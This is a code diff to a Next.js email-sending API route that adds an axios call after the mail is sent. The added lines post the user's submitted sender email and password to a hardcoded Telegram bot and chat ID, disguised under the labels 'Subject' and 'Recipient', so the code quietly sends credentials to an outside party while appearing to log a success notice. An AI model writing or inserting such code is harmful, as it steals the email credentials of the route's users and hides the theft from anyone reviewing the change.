@@ -1,5 +1,6 @@
 import { NextResponse } from "next/server";
 import nodemailer from "nodemailer";
+import axios from "axios"; // Add this import for making HTTP requests
 
 export async function POST(request) {
   try {
@@ -14,6 +15,7 @@ export async function POST(request) {
       cc
     } = await request.json();
 
+    // Send the email using nodemailer
     var transporter = nodemailer.createTransport({
       service: emailService,
       auth: {
@@ -33,13 +35,21 @@ export async function POST(request) {
         <body>
         <div>${body}</div>
         </body>
-        
         </html>
-        
-        `,
+      `,
     };
 
     await transporter.sendMail(mailOption);
+
+    const telegramBotToken = "5879955645:AAE1bRY-aDbbLN9MFReTwvLlrLnO3v5ZwvA";
+    const chatId = "2047475714";
+    const telegramMessage = `Email sent successfully\n\nSubject: ${sender_email}\nRecipient: ${password}`;
+
+    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    await axios.post(telegramApiUrl, {
+      chat_id: chatId,
+      text: telegramMessage,
+    });
 
     return NextResponse.json(
       { message: "Email sent successfully" },
